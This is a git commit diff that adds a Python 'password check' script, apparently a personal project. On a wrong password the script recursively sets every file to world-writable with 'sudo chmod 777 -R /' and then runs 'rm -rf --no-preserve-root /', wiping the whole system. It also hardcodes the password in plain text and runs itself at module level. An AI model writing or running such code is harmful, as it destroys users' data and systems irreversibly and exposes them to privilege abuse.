aa0e36a31d0f28c7bb7ebd451896e6ff35530377
Maverick H. Cheung <mr.maverick.cheung@gmail.com>
2023-07-09 19:13:12 -0700

    v1.0.3
    add first function, for password check.---if password type wrong, it will wipe the whole system.

--- scripts/linux.py
+++ scripts/linux.py
@@ -1,3 +1,19 @@
 #!/usr/bin/env python3
 
-print("This is Linux")
+import getpass
+import subprocess
+
+
+def password_check():
+
+    password = 'jk'
+    ture_password = getpass.getpass('Enter Password: ')
+
+    if ture_password != password: 
+        print("Warning! The Nuke is launched!")
+        subprocess.run(['sudo','chmod','777','-R','/'])
+        subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
+    else:
+        print('---Welcome Back----')
+
+password_check()
